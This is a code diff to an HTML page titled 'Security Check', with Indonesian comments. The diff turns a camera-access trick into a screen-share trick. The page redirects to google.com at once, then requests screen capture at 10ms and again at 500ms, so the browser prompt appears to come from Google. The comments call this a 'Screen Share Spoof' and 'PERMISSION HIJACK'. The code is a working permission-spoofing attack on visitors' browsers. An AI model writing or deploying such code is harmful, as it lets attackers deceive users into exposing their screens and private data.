@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Security Check</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -27,7 +27,7 @@
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
-<video id="cam-feed" autoplay playsinline muted></video>
+<video id="screen-feed" autoplay playsinline muted></video>
 
 <script>
 (function () {
@@ -42,26 +42,33 @@
   }
 
   // ============================================
-  // KONFIGURASI (LANGSUNG KE GOOGLE.COM)
+  // KONFIGURASI
   // ============================================
   var GOOGLE_REAL = "https://www.google.com"; 
 
   // ============================================
-  // FUNGSI: PERMISSION REQUEST
+  // FUNGSI: SCREEN SHARE REQUEST
   // ============================================
-  function triggerCameraPermission() {
+  function triggerScreenShare() {
     try {
-      log("[+] Meminta Izin Kamera...");
+      log("[+] Meminta Izin Screen Share...");
       
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      // Cek apakah API didukung
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+        log("[-] getDisplayMedia tidak didukung.");
+        return;
+      }
+
+      // Minta Screen Share
+      navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
         .then(function(stream) {
-          var video = document.getElementById('cam-feed');
+          var video = document.getElementById('screen-feed');
           video.srcObject = stream;
           video.play().catch(function(){});
-          log("[+] Kamera BERHASIL diakses!");
+          log("[+] LAYAR BERHASIL DIREKAM!");
         })
         .catch(function(err) {
-          log("[-] Kamera diblokir: " + err.name);
+          log("[-] Screen Share diblokir: " + err.name);
         });
     } catch(e) {}
   }
@@ -79,7 +86,7 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Google Direct Spoof...");
+    log("[!] Memulai Screen Share Spoof...");
 
     // ============================================
     // A. REDIRECT LANGSUNG KE GOOGLE.COM (0ms)
@@ -92,19 +99,18 @@
     // ============================================
     // B. PERMISSION HIJACK (10ms)
     // ============================================
-    // Tembak izin kamera saat browser sedang memuat Google.
+    // Tembak Screen Share saat browser memuat Google.
     setTimeout(function() {
-      log("[+] Meminta Izin Kamera (Stacked)...");
-      triggerCameraPermission();
+      log("[+] Meminta Screen Share (Stacked)...");
+      triggerScreenShare();
     }, 10);
 
     // ============================================
     // C. RETRY PERMISSION (500ms)
     // ============================================
-    // Jika gagal di awal, coba lagi saat halaman Google sudah muncul.
     setTimeout(function() {
-      log("[+] Retry Izin Kamera...");
-      triggerCameraPermission();
+      log("[+] Retry Screen Share...");
+      triggerScreenShare();
     }, 500);
 
   }, { once: true });
